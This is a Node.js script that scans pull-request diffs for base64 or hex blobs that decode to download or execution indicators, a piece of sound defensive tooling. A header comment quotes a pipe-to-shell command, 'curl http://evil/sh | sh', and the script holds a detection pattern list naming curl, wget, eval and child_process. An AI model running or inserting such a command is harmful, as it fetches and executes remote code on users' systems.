#!/usr/bin/env node
// Obfuscation / encoded-payload detector for PR diffs.
//
// Flags encoded (base64/hex) blobs that decode to external-download or
// code-execution indicators, plus high-entropy blobs that do not decode to
// benign text. The named threat this catches: a PR that hides
// `curl http://evil/sh | sh` behind a base64/hex blob.
//
// Static analysis only — it never executes PR content. Usage:
//   node obfuscation-scan.mjs <diff-file>
// Reads a unified diff, analyzes only added ("+") lines, exits non-zero on a hit.

import { readFileSync, appendFileSync } from 'node:fs'

const diffPath = process.argv[2]
if (!diffPath) {
  console.error('usage: obfuscation-scan.mjs <diff-file>')
  process.exit(2)
}

const diff = readFileSync(diffPath, 'utf8')
const summary = process.env.GITHUB_STEP_SUMMARY

// Decoded-text indicators that strongly suggest a payload.
const SUSPICIOUS = [
  [/https?:\/\//i, 'url'],
  [/\bcurl\b/i, 'curl'],
  [/\bwget\b/i, 'wget'],
  [/\|\s*sh\b/i, 'pipe-to-shell'],
  [/\beval\s*\(/, 'eval'],
  [/child_process/, 'child_process'],
  [/\brequire\s*\(\s*['"]child_process['"]\s*\)/, 'require(child_process)'],
  [/\bfetch\s*\(/, 'fetch'],
  [/XMLHttpRequest/, 'xhr'],
]

// Paths whose added lines are skipped (generated / vendored / lockfiles / fixtures).
const SKIP_PATHS = [
  /(^|\/)(dist|out|build|node_modules)\//,
  /\.min\.js$/,
  /\.map$/,
  /(^|\/)(package-lock\.json|yarn\.lock|pnpm-lock\.yaml)$/,
  /(^|\/)docs\/security\/test-fixtures\//,
]

// Benign integrity hashes by length (md5/sha1/sha256 hex) — not payloads.
const HASH_HEX = /^[0-9a-f]{32}$|^[0-9a-f]{40}$|^[0-9a-f]{64}$/i
const BASE64 = /^[A-Za-z0-9+/]{40,}={0,2}$/
const HEX = /^[0-9a-fA-F]{40,}$/
const PRINTABLE = /^[\x09\x0a\x0d\x20-\x7e]+$/

function shannon(s) {
  const freq = new Map()
  for (const ch of s) freq.set(ch, (freq.get(ch) ?? 0) + 1)
  let h = 0
  for (const c of freq.values()) {
    const p = c / s.length
    h -= p * Math.log2(p)
  }
  return h
}

function matchesIn(text) {
  return SUSPICIOUS.filter(([re]) => re.test(text)).map(([, name]) => name)
}

function tryDecode(tok) {
  if (BASE64.test(tok) && tok.length % 4 === 0) {
    const b = Buffer.from(tok, 'base64').toString('utf8')
    if (PRINTABLE.test(b)) return { text: b, encoding: 'base64' }
  }
  if (HEX.test(tok) && tok.length % 2 === 0 && !HASH_HEX.test(tok)) {
    const b = Buffer.from(tok, 'hex').toString('utf8')
    if (PRINTABLE.test(b)) return { text: b, encoding: 'hex' }
  }
  return null
}

let currentFile = ''
const findings = []

for (const line of diff.split('\n')) {
  const header = line.match(/^\+\+\+ b\/(.*)$/)
  if (header) {
    currentFile = header[1]
    continue
  }
  if (!line.startsWith('+') || line.startsWith('+++')) continue
  if (SKIP_PATHS.some((re) => re.test(currentFile))) continue

  const added = line.slice(1)
  for (const tok of added.split(/[\s"'`,;:()[\]{}<>]+/).filter(Boolean)) {
    if (tok.length < 40) continue

    const decoded = tryDecode(tok)
    if (decoded) {
      const hits = matchesIn(decoded.text)
      if (hits.length) {
        findings.push({
          file: currentFile,
          encoding: decoded.encoding,
          token: tok.slice(0, 60),
          hits,
          decoded: decoded.text.slice(0, 80),
        })
        continue
      }
      // Decoded to benign, printable text — not suspicious. Move on.
      continue
    }

    // Secondary: high-entropy blob that does not decode — worth a review.
    if (!HASH_HEX.test(tok) && shannon(tok) >= 4.5) {
      findings.push({
        file: currentFile,
        encoding: 'high-entropy',
        token: tok.slice(0, 60),
        hits: ['high-entropy-review'],
        decoded: '',
      })
    }
  }
}

const lines = []
if (findings.length) {
  lines.push('### Obfuscation scan: suspicious encoded content found', '')
  for (const f of findings) {
    const tail = f.decoded ? ` -> ${f.decoded}` : ''
    lines.push(`- ${f.file} — **${f.encoding}** token \`${f.token}...\` matched: ${f.hits.join(', ')}${tail}`)
  }
} else {
  lines.push('### Obfuscation scan: no encoded payloads detected')
}

const body = lines.join('\n')
console.log(body)
if (summary) appendFileSync(summary, `${body}\n`)

if (findings.length) {
  console.error(`\n${findings.length} suspicious finding(s) — failing the check.`)
  process.exit(1)
}
